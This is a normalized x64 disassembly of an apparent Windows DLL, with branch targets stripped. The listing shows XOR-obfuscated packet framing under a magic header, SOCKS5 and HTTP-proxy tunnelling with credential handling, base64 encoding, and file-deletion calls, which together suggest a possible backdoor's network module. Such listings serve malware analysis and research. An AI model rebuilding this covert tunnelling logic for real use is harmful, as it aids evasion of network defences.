add rsp 0x20
pop rdi
retn
cmp edi [ rbx + 0x18 ]
jbe r-xdata
mov rax [ rbx + 0x4 ]
mov rsi [ rsp + 0x30 ]
mov [ rbx + 0xc ] edi
mov [ rbx + 0x10 ] rax
xor eax eax
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
sub_18001eda0
test rcx rcx
je r-xdata
retn
push rbx
sub rsp 0x20
mov rbx rcx
call [ GetTickCount@IAT ]
mov [ rbx + 0x8 ] eax
test eax eax
jne r-xdata
mov eax [ rbx + 0x8 ]
mov rcx 0x100000001
xor [ rbx ] eax
xor [ rbx + 0x4 ] eax
xor [ rbx + 0x18 ] eax
xor [ rbx + 0x14 ] eax
imul rax rcx
xor [ rbx + 0xc ] rax
add rsp 0x20
pop rbx
mov [ rbx + 0x8 ] 0x1
sub_18001edf0
test rcx rcx
je r-xdata
retn
mov r8d [ rcx ]
cmp r8d 0xaced1984
je r-xdata
mov edx [ rcx + 0x8 ]
xor [ rcx + 0x4 ] edx
xor [ rcx + 0x18 ] edx
xor [ rcx + 0x14 ] edx
mov eax edx
xor eax r8d
mov [ rcx ] eax
mov rax 0x100000001
imul rdx rax
xor [ rcx + 0xc ] rdx
sub_18001ee30
mov rdx rcx
test rcx rcx
je r-xdata
retn
mov ecx [ rcx + 0x14 ]
cmp ecx 0x1
jb r-xdata
cmp [ rdx ] 0xaced1984
je r-xdata
mov eax ecx
mov eax [ rdx + 0x8 ]
xor eax ecx
jmp r-xdata
mov r8d eax
nop
shr eax 0x2
lea rcx [ rdx + 0x1c ]
test eax eax
je r-xdata
mov eax [ rdx + 0x8 ]
add rcx 0x4
xor [ rcx - 0x4 ] eax
dec r8
jne r-xdata
sub_18001ee80
mov [ rsp + 0x20 ] rbx
push rsi
push r12
push r13
sub rsp 0x20
mov r12d r9d
mov ebx r8d
mov r13 rdx
mov rsi rcx
test rcx rcx
je r-xdata
mov eax 0xabcd0000
mov rbx [ rsp + 0x58 ]
add rsp 0x20
pop r13
pop r12
pop rsi
retn
test rdx rdx
je r-xdata
cmp ebx 0x1
jb r-xdata
cmp ebx 0xfa0
jbe r-xdata
mov [ rsp + 0x48 ] rdi
mov rdi [ rcx + 0x4 ]
mov edx ebx
mov rcx r13
mov [ rdi ] 0xaced1984
call sub_180001040
mov [ rdi + 0x14 ] ebx
mov [ rdi + 0xc ] rax
test r12d r12d
jne r-xdata
mov eax 0xabcd000c
mov rbx [ rsp + 0x58 ]
add rsp 0x20
pop r13
pop r12
pop rsi
retn
mov [ rsp + 0x40 ] rbp
test r12b 0x1
je r-xdata
lea rcx [ rdi + 0x1c ]
mov r8 rbx
mov rdx r13
mov [ rsi + 0xc ] ebx
call sub_18001d240
add [ rsi + 0xc ] 0x1c
mov rdi [ rsp + 0x48 ]
xor eax eax
mov rbx [ rsp + 0x58 ]
add rsp 0x20
pop r13
pop r12
pop rsi
retn
lea rcx [ rdi + 0x1c ]
mov r8 rbx
mov rdx r13
call sub_18001d240
lea r9 [ rdi + 0x14 ]
lea r8 [ rdi + 0x1c ]
mov edx ebx
mov rcx r13
mov [ rsp + 0x50 ] r14
call sub_1800010a0
test eax eax
jne r-xdata
add [ rsi + 0xc ] 0x1c
mov rbp [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
xor eax eax
mov rbx [ rsp + 0x58 ]
add rsp 0x20
pop r13
pop r12
pop rsi
retn
mov eax [ rdi + 0x14 ]
mov rcx rdi
mov [ rsi + 0xc ] eax
call sub_18001eda0
mov rcx rdi
call sub_18001ee30
lea rcx [ rdi + 0x1c ]
mov r8 rbx
mov rdx r13
and r12d 0xfffffffe
mov [ rdi + 0x14 ] ebx
call sub_18001d240
cmp [ rdi + 0x14 ] ebx
jb r-xdata
mov [ rdi + 0x4 ] r12d
mov [ rdi + 0x18 ] ebx
test r12b 0x4
je r-xdata
mov eax [ rdi + 0x14 ]
mov r14 [ rsp + 0x50 ]
mov [ rsi + 0xc ] eax
jmp r-xdata
sub_18001efe0
push rbx
push rbp
push rsi
push r13
push r14
sub rsp 0x20
xor r14d r14d
mov r13 r9
mov rsi r8
mov rbp rdx
mov ebx r14d
test rcx rcx
je r-xdata
mov eax 0xabcd0000
add rsp 0x20
pop r14
pop r13
pop rsi
pop rbp
pop rbx
retn
test rdx rdx
je r-xdata
test r8 r8
je r-xdata
test r9 r9
je r-xdata
mov [ rdx ] r14
mov [ rsp + 0x58 ] rdi
mov [ r8 ] r14d
mov rdi [ rcx + 0x10 ]
mov [ rsp + 0x60 ] r12
test rdi rdi
je r-xdata
mov [ rsi ] r14d
mov ebx 0xabcd000a
mov [ rbp ] r14
mov eax [ rcx + 0xc ]
test eax eax
je r-xdata
cmp eax 0x1c
jb r-xdata
cmp [ rdi ] 0xaced1984
jne r-xdata
mov eax [ rdi + 0x4 ]
test eax eax
jne r-xdata
test al 0x4
je r-xdata
mov r12 [ rsp + 0x60 ]
lea rax [ rdi + 0x1c ]
mov [ rdx ] rax
mov eax [ rdi + 0x14 ]
mov rdi [ rsp + 0x58 ]
mov [ r8 ] eax
mov eax ebx
add rsp 0x20
pop r14
pop r13
pop rsi
pop rbp
pop rbx
retn
mov eax [ rdi + 0x4 ]
and eax 0x1
cmp al 0x1
jne r-xdata
mov rcx rdi
call sub_18001ee30
lea r9 [ rdi + 0x1c ]
mov [ rbp ] r9
mov eax [ rdi + 0x14 ]
mov [ rsi ] eax
mov edx [ rsi ]
mov rcx [ rbp ]
call sub_180001040
cmp rax [ rdi + 0xc ]
je r-xdata
mov ecx [ rdi + 0x18 ]
cmp ecx [ r13 + 0xc ]
ja r-xdata
mov r12 [ rsp + 0x60 ]
mov rdi [ rsp + 0x58 ]
mov eax ebx
add rsp 0x20
pop r14
pop r13
pop rsi
pop rbp
pop rbx
retn
mov eax [ rdi + 0x14 ]
mov r8 [ r13 + 0x4 ]
mov [ r13 + 0xc ] ecx
lea rcx [ rdi + 0x1c ]
lea r9 [ r13 + 0xc ]
lea rdx [ rsp + 0x50 ]
mov [ rsp + 0x50 ] eax
call sub_180001100
test eax eax
jne r-xdata
mov rax [ r13 + 0x4 ]
mov [ rbp ] rax
mov eax [ r13 + 0xc ]
mov [ rsi ] eax
sub_18001f130
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rdi rcx
mov ebx 0x400
test rcx rcx
je r-xdata
mov eax ebx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov eax [ rcx + 0x18 ]
cmp eax 0x1c
jb r-xdata
mov rcx [ rdi + 0x4 ]
mov rdx [ rdi + 0x10 ]
mov ebx 0x401
cmp rcx rdx
je r-xdata
mov rcx [ rcx + 0x10 ]
call sub_18001edf0
cmp [ rcx ] 0xaced1984
jne r-xdata
mov r8d eax
call sub_18001d230
mov ecx [ rdi + 0x18 ]
mov r11 [ rdi + 0x4 ]
mov r8d [ rdi + 0xc ]
xor edx edx
mov [ rdi + 0x10 ] r11
sub r8d ecx
add rcx r11
call sub_18001d220
mov eax ebx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov ecx [ rcx + 0x14 ]
mov eax [ rdi + 0x18 ]
add ecx 0x1c
cmp ecx eax
jbe r-xdata
jne r-xdata
cmp ecx eax
jae r-xdata
mov ebx 0x402
mov eax ebx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov ebx 0x403
sub_18001f1e0
push rbx
sub rsp 0x20
mov rbx rcx
test rcx rcx
je r-xdata
mov eax 0x400
add rsp 0x20
pop rbx
retn
call sub_18001f130
cmp eax 0x403
je r-xdata
mov r8 [ rbx + 0x10 ]
mov edx [ rbx + 0x18 ]
mov ecx [ r8 + 0x14 ]
add ecx 0x1c
cmp ecx edx
jb r-xdata
cmp eax 0x402
jne r-xdata
mov eax ecx
sub edx ecx
mov rcx rbx
add rax r8
mov [ rbx + 0x18 ] edx
mov [ rbx + 0x10 ] rax
call sub_18001f130
add rsp 0x20
pop rbx
retn
mov r8d [ rbx + 0x18 ]
mov rcx [ rbx + 0x10 ]
xor edx edx
call sub_18001d220
mov r11 [ rbx + 0x4 ]
mov [ rbx + 0x18 ] 0x0
mov [ rbx + 0x10 ] r11
mov eax 0x404
add rsp 0x20
pop rbx
retn
sub_18001f270
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0x20
mov rbx rdx
mov rdi rcx
test rcx rcx
je r-xdata
mov eax 0x400
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
test rdx rdx
je r-xdata
cmp [ rcx + 0x4 ] 0x0
mov [ rsp + 0x30 ] rsi
je r-xdata
mov eax 0x400
mov rsi [ rsp + 0x30 ]
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
cmp [ rcx + 0xc ] 0xfbc
jbe r-xdata
lea rsi [ rdx + 0x1c ]
test rsi rsi
je r-xdata
cmp [ rdx + 0x14 ] 0x1
jb r-xdata
mov edx [ rdx + 0x4 ]
mov ecx edx
call sub_18001ed70
test eax eax
je r-xdata
bt edx 0x1d
jae r-xdata
mov ecx [ rdi + 0xc ]
mov eax [ rbx + 0x14 ]
add rcx [ rdi + 0x4 ]
add rax [ rdi + 0x10 ]
cmp rcx rax
jb r-xdata
mov rcx rdi
call sub_18001e7b0
test [ rbx + 0x4 ] 0x4
je r-xdata
mov r8d [ rbx + 0x14 ]
mov rcx [ rdi + 0x10 ]
mov rdx rsi
call sub_18001d240
mov eax [ rbx + 0x14 ]
mov rsi [ rsp + 0x30 ]
add [ rdi + 0x18 ] eax
mov eax [ rbx + 0x14 ]
add [ rdi + 0x10 ] rax
mov ecx [ rbx + 0x4 ]
xor eax eax
and ecx 0x80000000
cmp ecx 0x80000000
sete al
add eax 0x405
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
mov rcx rbx
call sub_18001ee30
sub_18001f370
push rbx
push r12
push r13
sub rsp 0x20
mov r13d r9d
mov r12 rdx
mov rbx rcx
test rdx rdx
je r-xdata
mov eax 0x400
add rsp 0x20
pop r13
pop r12
pop rbx
retn
test rcx rcx
je r-xdata
cmp [ rcx ] 0x0
je r-xdata
cmp [ rcx + 0x10 ] 0x0
je r-xdata
cmp [ rcx + 0x18 ] 0x1
jb r-xdata
mov [ rsp + 0x40 ] rbp
mov [ rsp + 0x48 ] rsi
mov [ rsp + 0x50 ] rdi
mov rdi [ rdx + 0x4 ]
mov ecx 0x40000000
mov edx 0x20000000
mov [ rdi + 0x4 ] 0x0
mov rax [ rbx + 0x10 ]
mov [ rsp + 0x58 ] r14
cmp [ rbx + 0x4 ] rax
mov [ rdi ] 0xaced1984
mov r14d 0xfa0
cmove ecx edx
mov [ rdi + 0x4 ] ecx
mov edx [ rbx + 0x18 ]
mov rax [ rbx + 0x10 ]
mov ecx edx
add rax r14
add rcx [ rbx + 0x4 ]
cmp rax rcx
jae r-xdata
mov r14d [ rbx + 0x4 ]
mov esi 0x406
sub r14d [ rbx + 0x10 ]
mov [ rdi + 0xc ] r8
mov eax [ rbx + 0xc ]
add r14d edx
or [ rdi + 0x4 ] 0x80000000
mov [ rdi + 0x18 ] eax
mov esi 0x405
jmp r-xdata
add [ rbx + 0x10 ] rbp
mov [ rbx + 0x10 ] 0x0
jmp r-xdata
mov rdx [ rbx + 0x10 ]
lea rcx [ rdi + 0x1c ]
mov r8d r14d
mov ebp r14d
call sub_18001d240
or [ rdi + 0x4 ] r13d
lea eax [ r14 + 0x1c ]
mov [ rdi + 0x14 ] r14d
mov r14 [ rsp + 0x58 ]
mov [ r12 + 0xc ] eax
cmp esi 0x406
jne r-xdata
mov rdi [ rsp + 0x50 ]
mov eax esi
mov rsi [ rsp + 0x48 ]
add rsp 0x20
pop r13
pop r12
pop rbx
retn
mov rcx rdi
call sub_18001eda0
mov rcx rdi
call sub_18001ee30
mov rbp [ rsp + 0x40 ]
test r13b 0x4
je r-xdata
sub_18001f4c0
push rbx
sub rsp 0x260
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x250 ] rax
mov rbx rcx
lea rcx [ rsp + 0x48 ]
xor edx edx
mov r8d 0x200
mov [ rsp + 0x40 ] 0x0
call sub_18000bd10
mov [ rsp + 0x30 ] 0xf
lea rcx [ rsp + 0x40 ]
mov rdx rbx
mov [ rsp + 0x34 ] 0x0
call sub_18001d2a0
lea r11 [ rsp + 0x30 ]
lea rdx [ rsp + 0x40 ]
xor r9d r9d
xor r8d r8d
xor ecx ecx
mov [ rsp + 0x20 ] r11
call [ select@IAT ]
mov rcx [ rsp + 0x250 ]
xor rcx rsp
call sub_18000c060
add rsp 0x260
pop rbx
retn
sub_18001f550
mov [ rsp + 0x18 ] rbx
mov [ rsp + 0x20 ] rdi
push r12
sub rsp 0x20
mov r12d r8d
mov rbx rdx
mov rdi rcx
test rcx rcx
je r-xdata
mov rbx [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
xor eax eax
add rsp 0x20
pop r12
retn
test rdx rdx
je r-xdata
mov [ rsp + 0x30 ] rbp
mov [ rsp + 0x38 ] rsi
call [ lstrlenA@IAT ]
mov esi eax
mov eax 0xaaaaaaab
mul esi
mov eax 0x4
mov ebp edx
shr ebp 0x1
lea r8d [ rbp + rbp * 2 ]
cmp esi r8d
mov r8d 0x0
cmovne r8d eax
lea ecx [ r8 + rbp * 4 + 0x1 ]
cmp r12d ecx
jae r-xdata
mov r8 r12
xor edx edx
mov rcx rbx
call sub_18001d220
lea r8 [ r--data ]
cmp esi 0x3
jb r-xdata
xor eax eax
test esi esi
je r-xdata
mov edx ebp
mov eax 0x1
jmp r-xdata
movzx eax [ rdi ]
shr rax 0x2
movzx eax [ rax + r8 ]
mov [ rbx ] al
movzx ecx [ rdi ]
and cl 0x3
shl cl 0x4
cmp esi 0x1
jbe r-xdata
movzx eax [ rdi ]
add rbx 0x4
add rdi 0x3
shr rax 0x2
add esi 0xfffffffd
movzx eax [ rax + r8 ]
mov [ rbx - 0x4 ] al
movzx eax [ rdi - 0x3 ]
and eax 0x3
shl eax 0x4
movsxd rcx eax
movzx eax [ rdi - 0x2 ]
shr eax 0x4
or rcx rax
movzx eax [ rcx + r8 ]
mov [ rbx - 0x3 ] al
movzx eax [ rdi - 0x2 ]
and eax 0xf
shl eax 0x2
movsxd rcx eax
movzx eax [ rdi - 0x1 ]
shr rax 0x6
or rcx rax
movzx eax [ rcx + r8 ]
mov [ rbx - 0x2 ] al
movzx eax [ rdi - 0x1 ]
and eax 0x3f
dec rdx
movzx eax [ rax + r8 ]
mov [ rbx - 0x1 ] al
jne r-xdata
mov rbp [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
mov rbx [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
add rsp 0x20
pop r12
retn
movzx eax cl
movzx eax [ rax + r8 ]
mov [ rbx + 0x1 ] al
cmp esi 0x2
jae r-xdata
movzx eax [ rdi + 0x1 ]
shr al 0x4
or cl al
movzx eax [ rdi + 0x1 ]
and eax 0xf
shl eax 0x2
cdqe
movzx eax [ rax + r8 ]
mov [ rbx + 0x2 ] al
mov [ rbx + 0x3 ] 0x3d
mov al 0x3d
mov [ rbx + 0x2 ] al
mov [ rbx + 0x3 ] al
mov eax 0x1
jmp r-xdata
sub_18001f6e0
push rbp
push rsi
lea rbp [ rsp - 0x178 ]
sub rsp 0x278
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x160 ] rax
mov rsi rcx
test rcx rcx
jne r-xdata
cmp [ rcx + 0x7c ] 0x0
je r-xdata
mov eax 0xabcd0000
jmp r-xdata
or eax 0xffffffff
cmp [ rcx + 0x20 ] 0x3
jne r-xdata
mov rcx [ rbp + 0x160 ]
xor rcx rsp
call sub_18000c060
add rsp 0x278
pop rsi
pop rbp
retn
mov [ rsp + 0x298 ] rbx
lea rcx [ rbp + 0x51 ]
xor edx edx
mov r8d 0x103
mov [ rsp + 0x2a8 ] r12
mov [ rbp + 0x50 ] 0x0
mov [ rsp + 0x270 ] r13
call sub_18000bd10
mov r12 [ rsi + 0xa0 ]
xor eax eax
lea rdx [ rsp + 0x20 ]
mov rcx r12
mov [ rsp + 0x21 ] ax
mov [ rsp + 0x20 ] 0x205
lea r8d [ rax + 0x4 ]
xor r9d r9d
mov [ rsp + 0x23 ] 0x2
call [ send@IAT ]
test eax eax
jg r-xdata
mov rcx r12
call sub_18001f4c0
test eax eax
jle r-xdata
call [ WSAGetLastError@IAT ]
jmp r-xdata
lea rcx [ rbp + 0x50 ]
xor edx edx
mov r8d 0x104
call sub_18001d220
lea rdx [ rbp + 0x50 ]
xor r9d r9d
mov r8d 0x104
mov rcx r12
call [ recv@IAT ]
test eax eax
jle r-xdata
mov r13 [ rsp + 0x270 ]
mov r12 [ rsp + 0x2a8 ]
mov rbx [ rsp + 0x298 ]
jmp r-xdata
cmp [ rbp + 0x50 ] 0x5
jne r-xdata
mov eax 0xabcd000e
movzx eax [ rbp + 0x51 ]
test al al
je r-xdata
lea rcx [ rsi + 0x2c ]
call [ lstrlenA@IAT ]
cmp [ rbp + 0x51 ] 0x2
movsxd r13 eax
jne r-xdata
cmp al 0x2
jne r-xdata
movzx ecx [ rsi + 0x8 ]
xor eax eax
mov [ rsp + 0x29 ] rax
mov [ rsp + 0x31 ] al
mov eax [ rsi + 0x4 ]
mov [ rsp + 0x2c ] eax
mov [ rsp + 0x28 ] 0x1000105
call [ htons@IAT ]
xor r9d r9d
lea rdx [ rsp + 0x28 ]
mov rcx r12
lea r8d [ r9 + 0xa ]
mov [ rsp + 0x30 ] ax
call [ send@IAT ]
test eax eax
jle r-xdata
test eax eax
jle r-xdata
mov rcx r12
call sub_18001f4c0
test eax eax
jle r-xdata
lea rcx [ rsi + 0x50 ]
mov [ rsp + 0x2a0 ] rdi
call [ lstrlenA@IAT ]
lea rcx [ rsp + 0x41 ]
xor edx edx
mov r8d 0x101
mov [ rsp + 0x24 ] eax
call sub_18000bd10
lea rdx [ rsi + 0x2c ]
lea rcx [ rsp + 0x42 ]
mov [ rsp + 0x40 ] 0x1
mov [ rsp + 0x41 ] r13b
call [ lstrcpyA@IAT ]
lea rcx [ rsp + r13 + 0x42 ]
lea rdx [ rsp + 0x24 ]
mov r8d 0x4
call sub_18001d240
lea rcx [ rsp + r13 + 0x43 ]
lea rdx [ rsi + 0x50 ]
call [ lstrcpyA@IAT ]
mov r11d [ rsp + 0x24 ]
lea rdx [ rsp + 0x40 ]
lea r8d [ r11 + r13 + 0x3 ]
xor r9d r9d
mov rcx r12
call [ send@IAT ]
mov rdi [ rsp + 0x2a0 ]
test eax eax
jle r-xdata
lea rcx [ rbp + 0x50 ]
xor edx edx
mov r8d 0x104
call sub_18001d220
lea rdx [ rbp + 0x50 ]
xor r9d r9d
mov r8d 0x104
mov rcx r12
call [ recv@IAT ]
test eax eax
jle r-xdata
mov rcx r12
call sub_18001f4c0
test eax eax
jle r-xdata
cmp [ rbp + 0x50 ] 0x5
jne r-xdata
lea rcx [ rbp + 0x50 ]
xor edx edx
mov r8d 0x104
call sub_18001d220
lea rdx [ rbp + 0x50 ]
xor r9d r9d
mov r8d 0x104
mov rcx r12
call [ recv@IAT ]
test eax eax
jle r-xdata
cmp [ rbp + 0x51 ] 0x0
jne r-xdata
cmp [ rbp + 0x50 ] 0x1
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ rbp + 0x51 ] 0x0
jne r-xdata
sub_18001f9c0
push rdi
sub rsp 0x470
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x460 ] rax
mov rdi rcx
test rcx rcx
jne r-xdata
cmp [ rcx + 0x20 ] 0x1
jne r-xdata
mov eax 0xabcd0000
jmp r-xdata
mov [ rsp + 0x488 ] rbx
lea rcx [ rsp + 0x31 ]
xor edx edx
mov r8d 0x207
mov [ rsp + 0x490 ] rbp
mov [ rsp + 0x30 ] 0x0
mov [ rsp + 0x498 ] rsi
call sub_18000bd10
mov ecx [ rdi + 0x4 ]
call [ inet_ntoa@IAT ]
lea rcx [ rdi + 0x2c ]
mov rsi rax
call [ lstrlenA@IAT ]
test eax eax
jle r-xdata
mov rcx [ rsp + 0x460 ]
xor rcx rsp
call sub_18000c060
add rsp 0x470
pop rdi
retn
movzx eax [ rdi + 0x8 ]
lea r8 [ r--data ]
lea rcx [ rsp + 0x30 ]
mov r9 rsi
mov edx 0x208
mov [ rsp + 0x20 ] eax
call sub_18001d250
lea rbx [ rdi + 0x50 ]
mov rcx rbx
call [ lstrlenA@IAT ]
test eax eax
jle r-xdata
or eax 0xffffffff
lea rcx [ rsp + 0x30 ]
xor edx edx
mov r8d 0x208
call sub_18001d220
mov rcx [ rdi + 0xa0 ]
lea rdx [ rsp + 0x30 ]
xor r9d r9d
mov r8d 0x207
call [ recv@IAT ]
cmp eax 0x1
jl r-xdata
lea rcx [ rsp + 0x241 ]
xor edx edx
mov r8d 0x103
mov [ rsp + 0x240 ] 0x0
call sub_18000bd10
lea rcx [ rsp + 0x351 ]
xor edx edx
mov r8d 0x103
mov [ rsp + 0x350 ] 0x0
call sub_18000bd10
lea r9 [ rdi + 0x2c ]
lea r8 [ r--data ]
lea rcx [ rsp + 0x350 ]
mov edx 0x104
mov [ rsp + 0x20 ] rbx
call sub_18001d250
lea rdx [ rsp + 0x240 ]
lea rcx [ rsp + 0x350 ]
mov r8d 0x104
call sub_18001f550
movzx r11d [ rdi + 0x8 ]
lea rax [ rsp + 0x240 ]
mov [ rsp + 0x28 ] rax
lea r8 [ r--data ]
lea rcx [ rsp + 0x30 ]
mov r9 rsi
mov edx 0x208
mov [ rsp + 0x20 ] r11d
call sub_18001d250
jmp r-xdata
xor ecx ecx
mov eax ecx
lea rcx [ rsp + 0x30 ]
call [ lstrlenA@IAT ]
mov rcx [ rdi + 0xa0 ]
lea rdx [ rsp + 0x30 ]
mov r8d eax
xor r9d r9d
mov ebx eax
call [ send@IAT ]
mov rsi [ rsp + 0x498 ]
mov rbp [ rsp + 0x490 ]
cmp eax ebx
mov rbx [ rsp + 0x488 ]
jne r-xdata
cmp ecx 0x20
je r-xdata
inc rax
inc ecx
cmp rax 0x20
jl r-xdata
inc ecx
movsxd rax ecx
cmp [ rsp + rax + 0x30 ] 0x32
jne r-xdata
cmp [ rsp + rax + 0x30 ] 0x20
je r-xdata
lea eax [ rcx + 0x1 ]
cdqe
cmp [ rsp + rax + 0x30 ] 0x30
jne r-xdata
cmp [ rsp + rax + 0x31 ] 0x30
jne r-xdata
xor eax eax
jmp r-xdata
sub_18001fbec
push rbx
sub rsp 0x20
and [ rsp + 0x40 ] 0x0
lea r8 [ rsp + 0x40 ]
call sub_18001523c
mov rbx rax
test rax rax
jne r-xdata
mov rax rbx
add rsp 0x20
pop rbx
retn
cmp [ rsp + 0x40 ] eax
je r-xdata
call sub_18000ea3c
test rax rax
je r-xdata
call sub_18000ea3c
mov ecx [ rsp + 0x40 ]
mov [ rax ] ecx
sub_18001fc80
push rbp
sub rsp 0x40
mov rbp rdx
lea rax [ rbp + 0x40 ]
mov [ rsp + 0x30 ] rax
mov rax [ rbp + 0x90 ]
mov [ rsp + 0x28 ] rax
mov rax [ rbp + 0x88 ]
mov [ rsp + 0x20 ] rax
mov r9 [ rbp + 0x80 ]
mov r8 [ rbp + 0x78 ]
mov rdx [ rbp + 0x70 ]
call sub_18000d4d4
nop
add rsp 0x40
pop rbp
retn
sub_18001fe19
push rbp
sub rsp 0x20
mov rbp rdx
mov [ rbp + 0x68 ] rcx
mov [ rbp + 0x58 ] rcx
mov rax [ rbp + 0x58 ]
mov rcx [ rax ]
mov [ rbp + 0x28 ] rcx
mov [ rbp + 0x20 ] 0x0
mov rax [ rbp + 0x28 ]
cmp [ rax ] 0xe06d7363
jne r-xdata
mov rax [ rbp + 0x28 ]
cmp [ rax ] 0xe06d7363
jne r-xdata
mov rax [ rbp + 0x28 ]
cmp [ rax + 0x18 ] 0x4
jne r-xdata
mov [ rbp + 0x30 ] 0x0
mov rax [ rbp + 0x28 ]
cmp [ rax + 0x18 ] 0x4
jne r-xdata
mov rax [ rbp + 0x28 ]
cmp [ rax + 0x20 ] 0x19930520
je r-xdata
mov rax [ rbp + 0x28 ]
cmp [ rax + 0x20 ] 0x19930520
je r-xdata
mov rdx [ rbp + 0x28 ]
mov rax [ rbp + 0xc8 ]
mov rcx [ rax + 0x28 ]
cmp [ rdx + 0x28 ] rcx
jne r-xdata
mov rax [ rbp + 0x28 ]
cmp [ rax + 0x20 ] 0x19930521
je r-xdata
mov rax [ rbp + 0x28 ]
cmp [ rax + 0x30 ] 0x0
jne r-xdata
mov rax [ rbp + 0x28 ]
cmp [ rax + 0x20 ] 0x19930521
je r-xdata
mov [ rbp + 0x20 ] 0x1
mov rax [ rbp + 0x28 ]
cmp [ rax + 0x20 ] 0x19930522
jne r-xdata
call sub_18000f510
mov [ rax + 0x2c0 ] 0x1
mov [ rbp + 0x20 ] 0x1
mov [ rbp + 0x30 ] 0x1
jmp r-xdata
mov rax [ rbp + 0x28 ]
cmp [ rax + 0x20 ] 0x19930522
jne r-xdata
mov eax [ rbp + 0x30 ]
add rsp 0x20
pop rbp
retn
sub_18001ff19
push rbx
push rbp
sub rsp 0x28
mov rbp rdx
mov rcx [ rbp + 0x50 ]
call sub_18000d770
cmp [ rbp + 0x20 ] 0x0
jne r-xdata
call sub_18000f510
mov rcx [ rbp + 0xd0 ]
mov [ rax + 0xf0 ] rcx
call sub_18000f510
mov rcx [ rbp + 0xd8 ]
mov [ rax + 0xf8 ] rcx
add rsp 0x28
pop rbp
pop rbx
retn
mov rbx [ rbp + 0xc8 ]
cmp [ rbx ] 0xe06d7363
jne r-xdata
cmp [ rbx + 0x18 ] 0x4
jne r-xdata
cmp [ rbx + 0x20 ] 0x19930520
je r-xdata
mov rcx [ rbx + 0x28 ]
call sub_18000d73c
test eax eax
je r-xdata
cmp [ rbx + 0x20 ] 0x19930521
je r-xdata
mov dl 0x1
mov rcx rbx
call sub_180011d08
nop
cmp [ rbx + 0x20 ] 0x19930522
jne r-xdata
sub_180001000
sub rsp 0x28
mov eax [ rw-data ]
test eax eax
jne r-xdata
add rsp 0x28
retn
call sub_1800012b0
call sub_180001520
mov [ rw-data ] eax
sub_180001030
xor eax eax
retn
sub_1800013e0
push rbx
sub rsp 0x20
mov rbx rdx
call [ GetProcessHeap@IAT ]
mov r8 rbx
mov rcx rax
xor edx edx
add rsp 0x20
pop rbx
jmp [ HeapFree@IAT ]
sub_180007660
mov rax [ rcx ]
movsxd rdx edx
movzx eax [ rdx + rax ]
retn
sub_180007670
mov eax [ rcx + 0x10 ]
sub eax [ rcx + 0x8 ]
retn
sub_1800095e0
sub rsp 0x28
call sub_1800090b0
xor eax eax
add rsp 0x28
retn
sub_180009a10
mov rax [ rcx ]
retn
sub_18000a3c0
push rbx
sub rsp 0x20
mov rbx rcx
call [ GetModuleHandleA@IAT ]
test rax rax
jne r-xdata
add rsp 0x20
pop rbx
retn
mov rcx rbx
call [ LoadLibraryA@IAT ]
sub_18000a5f0
sub rsp 0x28
lea rax [ r--data ]
mov [ rcx ] rax
mov rcx [ rcx + 0x10 ]
cmp rcx 0xffffffffffffffff
je r-xdata
add rsp 0x28
retn
call [ CloseHandle@IAT ]
sub_18000aa10
sub rsp 0x28
lea rdx [ rsp + 0x38 ]
mov [ rsp + 0x38 ] 0x0
call sub_18000a8d0
mov rax [ rsp + 0x38 ]
add rsp 0x28
retn
j_sub_18000ca24
jmp sub_18000ca24
sub_18000bb40
push rbx
sub rsp 0x20
mov edx 0x80
mov rbx rcx
call [ SetFileAttributesA@IAT ]
mov rcx rbx
add rsp 0x20
pop rbx
jmp [ DeleteFileA@IAT ]
sub_18000bb70
sub rsp 0x28
call [ GetFileAttributesA@IAT ]
cmp eax 0xffffffff
je r-xdata
xor eax eax
add rsp 0x28
retn
test al 0x10
jne r-xdata
mov eax 0x1
add rsp 0x28
retn
sub_18000bc60
lea rax [ r--data ]
mov [ rcx ] rax
jmp sub_18000d068
sub_18000bcb0
mov rdx rcx
lea rcx [ rw-data ]
mov r8d 0x12b
jmp sub_18000cf38
sub_18000bcd0
push rbx
sub rsp 0x20
mov rbx rcx
call sub_18000d0b4
lea r11 [ r--data ]
mov [ rbx ] r11
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_18000c030
sub rsp 0x28
mov r8 [ r9 + 0x38 ]
mov rcx rdx
mov rdx r9
call sub_18000bfcc
mov eax 0x1
add rsp 0x28
retn
sub_18000c0bc
sub rsp 0x28
mov rax rdx
lea rdx [ rcx + 0x11 ]
lea rcx [ rax + 0x11 ]
call sub_18000daf0
test eax eax
sete al
add rsp 0x28
retn
sub_18000c17c
mov r11 rsp
mov [ r11 + 0x18 ] r8
mov [ r11 + 0x20 ] r9
sub rsp 0x38
lea rax [ r11 + 0x20 ]
xor r9d r9d
mov [ r11 - 0x18 ] rax
call sub_18000ebac
add rsp 0x38
retn
j_sub_18000ec1c
jmp sub_18000ec1c
j_sub_18000ec1c#2
jmp j_sub_18000ec1c
sub_18000cf38
xor r9d r9d
jmp sub_18000ce20
sub_18000cf40
lea rax [ r--data ]
mov [ rcx ] rax
mov rax [ rdx ]
mov [ rcx + 0x10 ] 0x0
mov [ rcx + 0x8 ] rax
mov rax rcx
retn
sub_18000cf5c
cmp [ rcx + 0x8 ] 0x0
lea rax [ r--data ]
cmovne rax [ rcx + 0x8 ]
retn
sub_18000cfcc
push rbx
sub rsp 0x20
cmp [ rcx + 0x10 ] 0x0
mov rbx rcx
je r-xdata
and [ rbx + 0x8 ] 0x0
mov [ rbx + 0x10 ] 0x0
add rsp 0x20
pop rbx
retn
mov rcx [ rcx + 0x8 ]
call sub_18000ec1c
sub_18000d068
lea rax [ r--data ]
